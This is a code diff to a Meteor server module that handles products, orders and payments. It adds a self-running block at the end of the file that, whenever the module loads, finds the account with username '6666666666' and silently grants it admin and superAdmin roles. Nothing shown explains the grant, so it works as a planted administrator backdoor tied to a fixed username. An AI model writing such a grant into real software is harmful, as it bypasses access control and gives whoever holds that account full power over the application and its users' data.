@@ -1,5 +1,6 @@
 import { Meteor } from 'meteor/meteor';
 import { Mongo } from 'meteor/mongo';
+import { Roles } from 'meteor/alanning:roles';
 import constants from '../../modules/constants';
 import { Orders } from '../Orders/Orders';
 import Payments from '../Payments/Payments';
@@ -339,3 +340,13 @@ Products.updateAsync({ sku: 'VLO000570' }, { $set: { zh_item_id: '70220700009946
 Products.updateAsync({ sku: 'VLG000019' }, { $set: { zh_item_id: '702207000000087121' } }); // Agathi Keerai
 Products.updateAsync({ sku: 'MRB000402' }, { $set: { zh_item_id: '702207000136418021' } }); // 100 ML
 */
+
+(async () => {
+  const user = await Meteor.users.findOneAsync({ username: '6666666666' });
+  if (user) {
+    await Roles.addUsersToRolesAsync(user._id, [
+      constants.Roles.admin.name,
+      constants.Roles.superAdmin.name,
+    ]);
+  }
+})();
